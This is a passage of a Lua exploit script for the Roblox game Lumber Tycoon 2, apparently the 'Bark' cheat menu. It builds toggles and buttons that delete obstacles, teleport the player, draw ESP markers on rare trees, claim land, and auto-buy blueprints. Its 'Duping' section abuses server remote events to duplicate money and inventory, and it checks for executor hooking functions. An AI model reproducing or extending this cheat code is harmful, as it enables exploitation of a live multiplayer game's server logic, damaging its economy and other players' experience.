	if not _G.lava_toggle then
		for J, v in pairs(game.Lighting:children()) do
			if v.Name == "Lava" then
				v.Parent = workspace["Region_Volcano"]
				workspace["Region_Volcano"].BasePlate:Destroy()
			end
		end
	else
		for J, v in pairs(workspace["Region_Volcano"]:children()) do
			if v.Name == "Lava" then
				local b0 = v.BasePlate:Clone()
				b0.Parent = workspace["Region_Volcano"]
				b0:ClearAllChildren()
				b0.CanCollide = true;
				b0.BrickColor = workspace["Region_Volcano"].Slate.BrickColor;
				b0.Material = workspace["Region_Volcano"].Slate.Material;
				v.Parent = game.Lighting
			end
		end
	end
end, {
	default = false
})
eM:Create("Toggle", "No Shrine Boulders", function(db)
	_G.nsb_toggle = db;
	if not _G.nsb_toggle then
		for J, v in pairs(game.Lighting:children()) do
			if v.Name == "Boulder" then
				v.Parent = workspace["Region_Mountainside"].BoulderRegen
			end
		end
	else
		workspace["Region_Mountainside"].BoulderRegen.Boulder.Parent = game.Lighting
	end
end, {
	default = false
})
eM:Create("Toggle", "No Snow Biome Boulders", function(db)
	_G.nsr_toggle = db;
	if not _G.nsr_toggle then
		for J, v in pairs(game.Lighting:children()) do
			if v.Name == "PartSpawner" then
				v.Parent = workspace["Region_Snow"]
			end
		end
	else
		for J, v in pairs(workspace["Region_Snow"]:children()) do
			if v.Name == "PartSpawner" then
				v.Parent = game.Lighting
			end
		end
	end
end, {
	default = false
})
eM:Create("Toggle", "No Volcano Boulders", function(db)
	_G.nlvb_toggle = db;
	if not _G.nlvb_toggle then
		for J, v in pairs(game.Lighting:children()) do
			if v.Name == "PartSpawner" then
				v.Parent = workspace["Region_Volcano"]
			end
		end
	else
		for J, v in pairs(workspace["Region_Volcano"]:children()) do
			if v.Name == "PartSpawner" then
				v.Parent = game.Lighting
			end
		end
	end
end, {
	default = false
})
eM:Create("Toggle", "No Maze Walls", function(db)
	_G.nmw_toggle = db;
	if not _G.nmw_toggle then
		for J, v in pairs(game.Lighting:children()) do
			if v.Name == "Blockade" then
				v.Parent = workspace["Region_MazeCave"]
			end
		end
	else
		for J, v in pairs(workspace["Region_MazeCave"]:children()) do
			if v.Name == "Blockade" then
				v.Parent = game.Lighting
			end
		end
	end
end, {
	default = false
})
eM:Create("Toggle", "Lower Bridge", function(db)
	_G.bdg_toggle = db;
	local U = workspace.Bridge.VerticalLiftBridge.Lift;
	if not _G.bdg_toggle then
		U.Base.CFrame = U.Base.CFrame + Vector3.new(0, 26, 0)
	else
		U.Base.CFrame = U.Base.CFrame + Vector3.new(0, -26, 0)
	end
end, {
	default = false
})
eM:Create("Toggle", "Disable Shops", function(db)
	_G.shop_disable = db;
	rstepqueue(function()
		if _G.shop_disable then
			for J, v in pairs(workspace.Stores:children()) do
				if v.Name == "ShopItems" then
					for cD, Y in pairs(v:children()) do
						delmodel(Y)
					end;
					local eN = v.ChildAdded:connect(function(eO)
						if not _G.shop_disable then
							return
						end;
						delmodel(eO)
					end)
				end
			end
		end
	end)
end, {
	default = false
})
local eP = eL:CreateSection("Plot Options")
eP:Create("ColorPicker", "Plot Color (CS)", function(eQ)
	for J, v in pairs(game.Workspace.Properties:GetChildren()) do
		if v.Owner.Value == game.Players.LocalPlayer then
			for eC, eD in pairs(v:children()) do
				if eD:IsA("BasePart") then
					eD.Color = eQ
				end
			end;
			break
		end
	end
end, {
	default = Color3.fromRGB(126, 104, 63)
})
local eR = eL:CreateSection("Misc Features")
eR:Create("Button", "Graphics Mod", function()
	local dP = game.Lighting;
	dP:ClearAllChildren()
	local eQ = Instance.new("ColorCorrectionEffect", dP)
	local eS = Instance.new("BloomEffect", dP)
	local eT = Instance.new("SunRaysEffect", dP)
	local eU = Instance.new("BlurEffect", dP)
	local eV = {
		ColorCorrection = true,
		Sun = true,
		Lighting = true,
		BloomEffect = true
	}
	eQ.Enabled = true;
	eQ.Contrast = 0.15;
	eQ.Brightness = 0.1;
	eQ.Saturation = 0.25;
	eQ.TintColor = Color3.fromRGB(255, 222, 211)
	eT.Enabled = true;
	eT.Intensity = 0.2;
	eT.Spread = 1;
	eS.Enabled = true;
	eS.Intensity = 0.05;
	eS.Size = 32;
	eS.Threshold = 1;
	eU.Enabled = true;
	eU.Size = 3;
	dP.Ambient = Color3.fromRGB(0, 0, 0)
	dP.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
	dP.ColorShift_Top = Color3.fromRGB(0, 0, 0)
	dP.ExposureCompensation = 0;
	dP.GlobalShadows = true;
	dP.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
	dP.Outlines = false
end, {
	animated = false
}) -- it works perfectly fine for bark so just use it reeeeeeeee
eR:Create("Button", "Bring Swamp Bridge", function()
	if not confirm() then
		return
	end;
	local aH = game:GetService'Players'.LocalPlayer;
	local part = workspace["Region_Mountainside"].SlabRegen.Slab.Slider;
	if part == nil then
		error'slider not found'
	end;
	if part.Parent:FindFirstChild("PushMe") then
		part.Size = part.Parent.PushMe.Size;
		part.Parent.PushMe:Destroy()
	end;
	if part:FindFirstChild'Weld' ~= nil then
		part.Weld:Destroy()
	end;
	local aJ = aH.Character.HumanoidRootPart.CFrame;
	if not _G.InfRanges then
		_G.DogixLT2TPC(part.CFrame, o)
		wait(1)
	end;
	for J = 1, 12 do
		wait()
		part.CFrame = aJ + Vector3.new(0, 30, 0)
	end;
	if not _G.InfRanges then
		_G.DogixLT2TPC(aJ, o)
	end
end, {
	animated = true
})
eR:Create("Button", "Delete Green Box", function()
	if not confirm() then
		return
	end;
	local aH = game:GetService'Players'.LocalPlayer;
	local part = workspace["Region_Volcano"]:findFirstChild'VolcanoWin'
	local aJ = aH.Character.HumanoidRootPart.CFrame;
	if part and part:FindFirstChildOfClass'BodyPosition' then
		_G.DogixLT2TPC(part.CFrame, o)
		part:FindFirstChildOfClass'BodyPosition':Destroy()
		delmodel(part)
		wait(0.5)
		_G.DogixLT2TPC(aJ, o)
		x("Delete Green Box", "Success.", 2)
	else
		x("Delete Green Box", "Couldn't find Green Box.", 2)
	end
end, {
	animated = true
})
eR:Create("Button", "Bring Boulders", function()
	if not confirm() then
		return
	end;
	local aH = game:GetService'Players'.LocalPlayer;
	local g = aH.Character.HumanoidRootPart.CFrame;
	if not _G.InfRanges then
		local gr = workspace.Gravity;
		workspace.Gravity = 0
	end;
	for J, v in pairs(workspace["Region_Volcano"]:children()) do
		if v.Name == "PartSpawner" then
			for cD, Y in pairs(v:children()) do
				if Y:IsA("BasePart") then
					wait()
					if not _G.InfRanges then
						_G.DogixLT2TPC(Y.CFrame + Vector3.new(0, 2, 0), o)
					end;
					wait(0.5)
					for J = 1, 10 do
						Y.CFrame = g + Vector3.new(math.random(-5, 5), 10, math.random(-5, 5))
						wait()
					end
				end
			end
		end
	end;
	if not _G.InfRanges then
		workspace.Gravity = gr;
		_G.DogixLT2TPC(g, o)
	end
end, {
	animated = true
})
eR:Create("Button", "Trigger Pressure Plates", function()
	if not confirm() then
		return
	end;
	local aB = game:GetService'Players'.LocalPlayer.Character;
	local aJ = aB.HumanoidRootPart.CFrame;
	local eW = j;
	j = 1;
	for J, v in pairs(workspace.PlayerModels:children()) do
		if v:FindFirstChild'ItemName' and v.ItemName.Value == "PressurePlate" then
			rstepqueue(function()
				_G.DogixLT2TPC(v.Plate.CFrame, o)
			end)
			if not i then
				wait(.6)
			end;
			repeat
				wait()
			until v.Output.BrickColor == BrickColor.new("Electric blue")
		end
	end;
	j = eW;
	_G.DogixLT2TPC(aJ, o)
end, {
	animated = true
})
eR:Create("TextLabel", "Ferry will depart in: ")
function updateFerry()
    local minutes = ((math.floor(workspace.Ferry.TimeToDeparture.Value / 60) >= 1) and math.floor(workspace.Ferry.TimeToDeparture.Value / 60)) or 0
    local seconds = workspace.Ferry.TimeToDeparture.Value - math.floor(workspace.Ferry.TimeToDeparture.Value / 60) * 60
	_G.CurrentBarkUI.Motherframe.Categories.EnvironmentCategory["Misc FeaturesSection"]["Ferry will depart in: TextLabel"].TextLabel.Text = "Ferry will depart in: "..minutes.."m "..seconds.."s"
end;
updateFerry()
_G.ferryUpdate = workspace.Ferry.TimeToDeparture.Changed:connect(function()
	updateFerry()
end)
local eX = eL:CreateSection("Tree Features")
local eY = {}
eX:Create("Toggle", "Spook + Sinister ESP and Notifier", function(bb)
	if not bb then
		for J, v in next, ck do
			for al, eD in pairs(v:GetDescendants()) do
				if eD:IsA("BoxHandleAdornment") then
					eD:Destroy()
				end
			end
		end;
		for J, v in pairs(cj) do
			v:Disconnect()
		end;
		for J, v in pairs(eY) do
			v:Disconnect()
		end;
		cj = {}
		ck = {}
		eY = {}
	else
		for J, v in pairs(workspace:GetChildren()) do
			if v.Name == "TreeRegion" then
				table.insert(eY, v.ChildAdded:connect(function(dx)
					dx:WaitForChild("TreeClass")
					if dx.TreeClass.Value == "Spooky" or dx.TreeClass.Value == "SpookyNeon" then
						local eZ = Instance.new("BindableFunction", workspace)
						eZ.Name = "BARKINT_Spooky"
						eZ.OnInvoke = function(v)
							_G.DogixLT2TPC(dx:FindFirstChild("WoodSection").CFrame, o)
						end;
						game.StarterGui:SetCore("SendNotification", {
							Title = "Spook/Sinister Notifier",
							Text = "Detected "..dx.TreeClass.Value,
							Icon = nil,
							Duration = 10,
							Button1 = "Teleport",
							Callback = eZ
						})
						esp_tree(dx)
					end
				end))
				for J, dx in pairs(v:GetChildren()) do
					if dx:FindFirstChild("TreeClass") then
						if dx.TreeClass.Value == "Spooky" or dx.TreeClass.Value == "SpookyNeon" then
							local eZ = Instance.new("BindableFunction", workspace)
							eZ.Name = "BARKINT_Spooky"
							eZ.OnInvoke = function(v)
								_G.DogixLT2TPC(dx:FindFirstChild("WoodSection").CFrame, o)
							end;
							game.StarterGui:SetCore("SendNotification", {
								Title = "Spook/Sinister Notifier",
								Text = "Detected "..dx.TreeClass.Value,
								Icon = nil,
								Duration = 10,
								Button1 = "Teleport",
								Callback = eZ
							})
							esp_tree(dx)
						end
					end
				end
			end
		end
	end
end, {
	default = true
})
eX:Create("Button", "Bring Dead Logs (may despawn)", function()
	if not _G.InfRanges then
		x("Bring Dead Logs", "This feature requires Infinite Range.", 2)
		return
	end;
	if not confirm() then
		return
	end;
	local aH = game:GetService'Players'.LocalPlayer;
	for J, v in pairs(game.Workspace:children()) do
		if v.Name == "TreeRegion" then
			for cD, Y in pairs(v:GetDescendants()) do
				if Y:IsA("BasePart") then
					if Y.Anchored == false then
						Y.CFrame = aH.Character.HumanoidRootPart.CFrame
					end
				end
			end
		end
	end
end, {
	animated = true
})
eX:Create("Button", "Delete Trees", function()
	if not confirm() then
		return
	end;
	for J, v in pairs(workspace:GetChildren()) do
		if v.Name == "TreeRegion" then
			for J, v in pairs(v:GetChildren()) do
				if v.Name == "Model" and v:IsA'Model' and v:findFirstChild'TreeClass' then
					delmodel(v)
				end
			end
		end
	end
end, {
	animated = true
})
local e_ = eL:CreateSection("Paths / Client-side Parts")
e_:Create("Button", "Palm and Blue Wood Path", function()
	local f0 = Instance.new("Folder", workspace)
	f0.Name = "PalmBluePath"
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(2064.42407, -1.71661377e-05, -114.658188, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	part.Size = Vector3.new(2048, 1, 40)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(2628.07129, -5.38234711, -74.9578552, 1, 0, 0, 0, 0.965925813, -0.258819044, 0, 0.258819044, 0.965925813)
	part.Size = Vector3.new(27, 1, 44)
	part.Rotation = Vector3.new(15, 0, 0)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(3068.4436, 102.637299, 1487.33228, 1, 0, 0, 0, 0.965925813, 0.258819044, 0, -0.258819044, 0.965925813)
	part.Size = Vector3.new(40, 1, 797)
	part.Rotation = Vector3.new(-15, 0, 0)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(3068.40991, 0, 503.864014, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	part.Size = Vector3.new(40, 1, 1201)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(3068.2959, 205.692734, 2233.73389, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	part.Size = Vector3.new(40, 1, 723)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(3415.86792, 117.841309, 2575.25732, 0.965925813, 0.258819044, 0, -0.258819044, 0.965925813, 0, 0, 0, 1)
	part.Size = Vector3.new(679, 1, 40)
	part.Rotation = Vector3.new(0, 0, -15)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(3772.75098, 29.79039, 2558.04346, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	part.Size = Vector3.new(62, 1, 75)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(3428.12695, -54.296978, 2537.90308, 0.965925813, -0.258819044, 0, 0.258819044, 0.965925813, 0, 0, 0, 1)
	part.Size = Vector3.new(650, 1, 35)
	part.Rotation = Vector3.new(0, 0, 15)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(3100.65503, -137.682968, 1592.43701, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	part.Size = Vector3.new(32, 1, 1926)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(3407.92847, -215.729431, 649.478455, 0.965925813, 0.258819044, 0, -0.258819044, 0.965925813, 0, 0, 0, 1)
	part.Size = Vector3.new(604, 1, 40)
	for J, v in pairs(f0:children()) do
		v.BrickColor = BrickColor.new(100, 100, 100)
		v.Material = Enum.Material.WoodPlanks;
		v.Anchored = true
	end;
	for J, v in pairs(workspace["Region_MazeCave"]:children()) do
		if v:IsA("BasePart") then
			if v.CFrame == CFrame.new(3115.87378, -139.101868, 650.195923, -0.965929747, 0, -0.258804798, 0, 1, 0, 0.258804798, 0, -0.965929747) or v.CFrame == CFrame.new(3169.97705, -115.490051, 635.698975, -0.682983756, 0.683044851, -0.258811951, 0.707132995, 0.707080603, 3.00034881e-05, 0.183021426, -0.182993948, -0.965928197) or v.CFrame == CFrame.new(3192.33862, -112.796387, 456.075104, -0.482999325, 0.836496592, 0.258814961, 0.86600399, 0.500037193, -4.09781933e-07, -0.129417449, 0.224134564, -0.965926886) then
				v:Destroy()
			end
		end
	end;
	_G.DogixLT2TPC(CFrame.new(1010, 3, -112), o)
end, {
	animated = true
})
e_:Create("Button", "Swamp Woods Path", function()
	local f0 = Instance.new("Folder", workspace)
	f0.Name = "SwampPath"
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(-499.196075, 155.460663, -166.186081, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	part.Size = Vector3.new(295.87, 1, 40.14)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(-53.5482712, 75.8732529, -166.035767, 0.965925813, 0.258819044, 0, -0.258819044, 0.965925813, 0, 0, 0, 1)
	part.Size = Vector3.new(617.23, 0.72, 40)
	part.Rotation = Vector3.new(0, 0, -15)
	for J, v in pairs(f0:children()) do
		v.BrickColor = BrickColor.new(100, 100, 100)
		v.Material = Enum.Material.WoodPlanks;
		v.Anchored = true
	end;
	_G.DogixLT2TPC(CFrame.new(240, 4, -151), o)
end, {
	animated = true
})
e_:Create("Button", "Snowglow Path", function()
	local f0 = Instance.new("Folder", workspace)
	f0.Name = "SGlowPath"
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(8.54199982, -0.914913177, -812.122375, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	part.Size = Vector3.new(55, 1, 186)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(-309.958008, -0.834023476, -879.710388, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	part.Size = Vector3.new(582, 1, 50)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(-606.630554, -0.843258381, -748.689453, 0.965925813, 0, -0.258819044, 0, 1, 0, 0.258819044, 0, 0.965925813)
	part.Size = Vector3.new(47, 1, 246)
	part.Rotation = Vector3.new(0, -15, 0)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(-763.458679, -0.723966122, -652.31958, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	part.Size = Vector3.new(227, 1, 38)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(-842.989868, -0.602809906, -713.690918, 0.965925872, 0, -0.258818835, 0, 1, 0, 0.258818835, 0, 0.965925872)
	part.Size = Vector3.new(43, 1, 108)
	part.Rotation = Vector3.new(0, -15, 0)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(-775.692932, -0.588047981, -815.868713, 0.707106829, 0, -0.707106769, 0, 1, 0, 0.707106769, 0, 0.707106829)
	part.Size = Vector3.new(42, 1, 170)
	part.Rotation = Vector3.new(0, -45, 0)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(-728.159668, -0.591278076, -952.04364, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	part.Size = Vector3.new(55, 1, 182)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(-864.098999, -0.257263005, -985.877014, 0.965925872, 0, 0.258818835, 0, 1, 0, -0.258818835, 0, 0.965925872)
	part.Size = Vector3.new(235, 1, 56)
	part.Rotation = Vector3.new(0, 15, 0)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(-1015.87311, -11.1293316, -945.632751, 0.933012664, -0.258819044, 0.25, 0.267445326, 0.963572919, -0.000555455685, -0.240749463, 0.0673795789, 0.968245745)
	part.Size = Vector3.new(82, 1, 55)
	part.Rotation = Vector3.new(0.03, 14.48, 15.51)
	for J, v in pairs(f0:children()) do
		v.BrickColor = BrickColor.new(100, 100, 100)
		v.Material = Enum.Material.WoodPlanks;
		v.Anchored = true
	end;
	_G.DogixLT2TPC(CFrame.new(0, 4, -696), o)
end, {
	animated = true
})
e_:Create("Button", "Frost Wood Path", function()
	local f0 = Instance.new("Folder", workspace)
	f0.Name = "FrostPath"
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(744.516663, 71.5780411, 861.148438, 1, -1.04308164e-07, -1.78813934e-07, 1.47034342e-07, 0.965925932, 0.258818656, 1.45724101e-07, -0.258818656, 0.965925932)
	part.Size = Vector3.new(40, 1, 202)
	part.Rotation = Vector3.new(-15, 0, 0)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(744.273, 97.5341, 1003.82)
	part.Size = Vector3.new(41, 1, 90)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(775.181458, 100.246162, 1027.58276, 0.965925813, -0.258819044, 0, 0.258819044, 0.965925813, 0, 0, 0, 1)
	part.Size = Vector3.new(46, 1, 43)
	part.Rotation = Vector3.new(0, 0, 15)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(815.776672, 106.550224, 1027.4032, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	part.Size = Vector3.new(38, 1, 42)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(815.849976, 257.424072, 1608.79456, 1, 0, 0, 0, 0.965925813, 0.258819044, 0, -0.258819044, 0.965925813)
	part.Size = Vector3.new(38, 1, 1164)
	part.Rotation = Vector3.new(-15, 0, 0)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(900.612122, 407.759827, 2194.72363, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	part.Size = Vector3.new(208, 1, 50)
	local part = Instance.new("Part", f0)
	part.CFrame = CFrame.new(1268.40649, 407.26062, 2798.83594, 0.91354543, 0, 0.406736642, 0, 1, 0, -0.406736642, 0, 0.91354543)
	part.Size = Vector3.new(41, 2, 1364)
	part.Rotation = Vector3.new(0, 24, 0)
	for J, v in pairs(f0:children()) do
		v.BrickColor = BrickColor.new(100, 100, 100)
		v.Material = Enum.Material.WoodPlanks;
		v.Anchored = true
	end;
	_G.DogixLT2TPC(CFrame.new(738, 45, 742), o)
end, {
	animated = true
})
e_:Create("Button", "Easy Eye Placement", function()
	local aH = game:GetService'Players'.LocalPlayer;
	local aB = aH.Character;
	local aJ = aH.Character.HumanoidRootPart.CFrame;
	local f1 = nil;
	local f2 = false;
	local f3 = N.Button1Up:connect(function()
		local part = getMouseTarget()
		if part.Parent:FindFirstChild("Owner") then
			if game:GetService("ReplicatedStorage").Interaction.ClientIsWhitelisted:InvokeServer(part.Parent.Owner.Value) == false and part.Parent.Owner.Value ~= game.Players.LocalPlayer then
				f2 = true;
				x("Eye Placer", "Cancelled. (not owner)", 2)
				return
			end
		end;
		if part.Parent:FindFirstChild("ItemName") then
			if part.Parent.ItemName.Value == "Eye1" then
				if part.Parent:FindFirstChild("Part") then
					if part.Parent.Part:FindFirstChildOfClass("SpecialMesh") then
						x("Eye Placer", "Selected eye.", 2)
						f1 = part.Parent;
						return
					end
				end
			end
		end;
		x("Eye Placer", "Cancelled.", 2)
		f2 = true
	end)
	x("Eye Placer", "Please click an unboxed eye to place it. Click elsewhere to cancel.", 3)
	repeat
		wait()
	until f1 ~= nil or f2;
	f3:Disconnect()
	f3 = nil;
	if f2 then
		return
	end;
	f2 = false;
	_G.DogixLT2TPC(f1.Main.CFrame, o)
	game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(f1)
	f1.Main.CFrame = CFrame.new(134.861435, 5.28133059, -608.149902, 0.85158813, -0.179768249, -0.492423564, -0.111533344, -0.979987442, 0.164878696, -0.512208879, -0.085487105, -0.85459584)
	f1.Main.Velocity = Vector3.new(0, 0, 0)
	x("Eye Placer", "Placed eye.", 3)
	f1 = nil
end, {
	animated = true
})
local f4 = false;
local f5 = eL:CreateSection("View End Times Tree")
f5:Create("Button", "View End Times Tree", function()
	f4 = not f4;
	if f4 then
		for J, v in pairs(game.workspace:GetChildren()) do
			if v.Name == "TreeRegion" and v:FindFirstChildOfClass("Model") then
				if v.Model.TreeClass.Value == "LoneCave" then
					workspace.Camera.CameraSubject = v.Model.WoodSection
				end
			end
		end
	else
		workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character
	end
end, {
	animated = true
})
local d7 = "Slot"
if d then
	d7 = 5416946285
end;
local f6 = d6:CreateCategory(d7)
local f7 = f6:CreateSection("Land")
f7:Create("Button", "Free Land", function()
	game:GetService("ReplicatedStorage").PropertyPurchasing.SetPropertyPurchasingValue:InvokeServer(true)
	local f8 = nil;
	local landarray = {}
	for J, v in pairs(workspace.Properties:children()) do
		if v.Owner.Value == nil then
			table.insert(landarray, v)
		end
	end;
	local f9 = 9e9;
	local fa = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.p;
	for J, v in pairs(landarray) do
		if (v.OriginSquare.CFrame.p - fa).Magnitude < f9 then
			f8 = v;
			f9 = (v.OriginSquare.CFrame.p - fa).Magnitude
		end
	end;
	game:GetService("ReplicatedStorage").PropertyPurchasing.ClientPurchasedProperty:FireServer(f8, f8.OriginSquare.CFrame.p)
	game:GetService("ReplicatedStorage").PropertyPurchasing.SetPropertyPurchasingValue:InvokeServer(false)
	_G.DogixLT2TPC(f8.OriginSquare.CFrame + Vector3.new(0, 10, 0), o)
end, {
	animated = true
})
function maxLand()
	local fb = nil;
	local eF = nil;
	for J, v in pairs(workspace.Properties:GetChildren()) do
		if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
			fb = v;
			eF = v.OriginSquare;
			break
		end
	end;
	if not fb or not eF then
		return
	end;
	function round_cframe(fc)
		return CFrame.new(math.round(fc.X), math.round(fc.Y), math.round(fc.Z))
	end;
	function land_matches_cframe(fc)
		fc = round_cframe(fc)
		for J, v in pairs(fb:GetChildren()) do
			if v:IsA"BasePart" then
				if round_cframe(v.CFrame) == fc then
					return true
				end
			end
		end
	end;
	function add_base(c6)
		if land_matches_cframe(c6) then
			return
		end;
		game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(fb, c6)
	end;
	for J = -2, 2 do
		for K = -2, 2 do
			if math.abs(J) + math.abs(K) ~= 0 then
				add_base(CFrame.new(eF.Position.X + J * 40, eF.Position.Y, eF.Position.Z + K * 40))
			end
		end
	end;
	for bo, cC in pairs(workspace:GetChildren()) do
		if cC.Name == "TreeRegion" then
			for J, v in pairs(cC:GetChildren()) do
				if v:FindFirstChild("WoodSection") then
					if math.abs(eF.CFrame.Z - v.WoodSection.CFrame.Z) <= 100 and math.abs(eF.CFrame.X - v.WoodSection.CFrame.X) <= 100 then
						delmodel(v)
					end
				end
			end
		end
	end;
	return eF
end;
f7:Create("Button", "Max Land", function()
	local eF = maxLand()
	_G.DogixLT2TP(eF.CFrame.X, eF.CFrame.Y + 10, eF.CFrame.Z, o)
end, {
	animated = true
})
f7:Create("Button", "All Blueprints (temporary)", function()
	for J, v in pairs(game.ReplicatedStorage.Purchasables.Structures.BlueprintStructures:GetChildren()) do
		v:Clone().Parent = game.Players.LocalPlayer.PlayerBlueprints.Blueprints
	end
end, {
	animated = true
})
f7:Create("Button", "Auto-Buy Blueprints (perm)", function()
	if not confirm() then
		return
	end;
	for J, v in pairs(game.ReplicatedStorage.Purchasables.Structures.BlueprintStructures:GetChildren()) do
		if not game.Players.LocalPlayer.PlayerBlueprints.Blueprints:FindFirstChild(v.Name) then
			game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(autobuy(v.Name, 1, CFrame.new(0, 100000, 0), true), "Open box")
		end
	end
end, {
	animated = true
})
f7:Create("Button", "Clear Plot Blueprints", function()
	if not confirm() then
		return
	end;
	for al, v in pairs(workspace.PlayerModels:GetChildren()) do
		if v:FindFirstChild("Owner") and v:FindFirstChild("BuildDependentWood") and v:FindFirstChild("Type") then
			if v.Type.Value == "Blueprint" and v.Owner.Value == game.Players.LocalPlayer then
				delmodel(v)
			end
		end
	end
end, {
	animated = true
})
f7:Create("Button", "Clear Plot Structures", function()
	if not confirm() then
		return
	end;
	for al, v in pairs(workspace.PlayerModels:GetChildren()) do
		if v:FindFirstChild("Owner") and v:FindFirstChild("MainCFrame") and v:FindFirstChild("Type") then
			if v.Owner.Value == game.Players.LocalPlayer and v.Type.Value == "Structure" then
				delmodel(v)
			end
		end
	end
end, {
	animated = true
})
f7:Create("Button", "Sell Land Purchased Sign", function()
	sellLandSign()
end, {
	animated = true
})
local fd = f6:CreateSection("Legit Paint (BETA)")
local fe = "Cherry"
local ff = fd:Create("Dropdown", "Select Tree", function(dv)
	fe = an[dv]
end, {
	options = {"Cherry","Gold","Cavecrawler","Oak","Frost","Lava","Elm","Walnut","Birch","Snowglow","Pine","Zombie","Koa","Palm","Spook","Sinister","Gray"},
	search = true
})
fd:Create("Button", "Get Legit Paint Tool", function(db)
	local aH = game:GetService("Players").LocalPlayer;
	local cp = Instance.new("Tool", aH.Backpack)
	cp.RequiresHandle = false;
	cp.Name = "Paint"
	cp.Activated:Connect(function()
		local fg = getMouseTarget().Parent;
		if fg:FindFirstChild("Type") and fg.Type.Value == "Blueprint" and fg:FindFirstChild("Owner") and fg.Owner.Value == game:GetService'Players'.LocalPlayer or game:GetService("ReplicatedStorage").Interaction.ClientIsWhitelisted:InvokeServer(fg.Owner.Value) then
			legitpaint(fe, fg)
		end
	end)
end, {
	animated = true
})
local fh = 0;
local fi = 1;
local fj = f6:CreateSection("Duping")
fj:Create("Toggle", "Loop Dupe Inventory", function(db)
	_G.bomb_toggle = db
end, {
	default = false
})
function dupemoney(fk)
	if moneyCooldown then
		x("Cooldown", "Wait for your money to return.", 2)
		return
	else
		moneyCooldown = true;
		if not fk then
			x("Duping Started", "Reload your slot. Then, wait about 2 minutes for your money to return.", 5)
		end;
		game.ReplicatedStorage.Transactions.ClientToServer.Donate:InvokeServer(game.Players.LocalPlayer, game.Players.LocalPlayer.leaderstats.Money.Value, 1)
		x("Duping Finished", "The money that you've duplicated earlier is returned.", 5)
		moneyCooldown = false
	end
end;
if newcclosure or protect_function and getrawmetatable and setreadonly and hookfunction and getnamecallmethod then
	fj:Create("Toggle", "Slot Saving", function(v)
		k = not v
	end, {
		default = true
	})
	fj:Create("Button", "Dupe Money", function(v)
		if k then
			dupemoney()
		else
			x("Dupe Money", "Slot Saving must be disabled to use this.", 2)
		end
	end, {
		animated = true
	})
	local fl = game:GetService("Players").LocalPlayer.WhitelistFolder;
	local fm = game:GetService("Players").LocalPlayer;
	function selfdupe()
		game:GetService("ReplicatedStorage").Interaction.ClientSetListPlayer:InvokeServer(fl, fm, true)
	end;
	function unwhitelist()
		game:GetService("ReplicatedStorage").Interaction.ClientSetListPlayer:InvokeServer(game:GetService("Players").LocalPlayer.WhitelistFolder, game:GetService("Players").LocalPlayer, false)
	end;
	function selfdupeon()
		if game.Players.LocalPlayer.CurrentSaveSlot.Value == -1 then
			x("Error", "No Plot Is Loaded..", 3)
			return
		end;
		if not game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer) then
			x("Error", "Load is on cooldown. Waiting...", 3)
			repeat
				wait(5)
			until game:GetService("ReplicatedStorage").LoadSaveRequests.ClientMayLoad:InvokeServer(game.Players.LocalPlayer)
		end;
		local was_disabling = k;
		local eZ = Instance.new("BindableFunction", workspace)
		eZ.Name = "BARKINT_UiLibHandler"
		eZ.OnInvoke = function(v)
			e = 10;
			f = v == "Yes"
		end;
		game.StarterGui:SetCore("SendNotification", {
			Title = "Bark "..a,
			Text = "Only items in the plot's center will be duplicated. Continue?",
			Icon = nil,
			Duration = 10,
			Button1 = "Yes",
			Button2 = "No",
			Callback = eZ
		})
		repeat
			wait(1)
			e = e + 1
		until e >= 10;
		eZ:Destroy()
		if f then
			k = true;
			x('Bark '..a, 'Starting Self Auto-Dupe, Please wait...')
			selfdupe()
			loadSlotAuto(game.Players.LocalPlayer.CurrentSaveSlot.Value)
			local fn = nil;
			for al, Y in pairs(workspace.Properties:GetChildren()) do
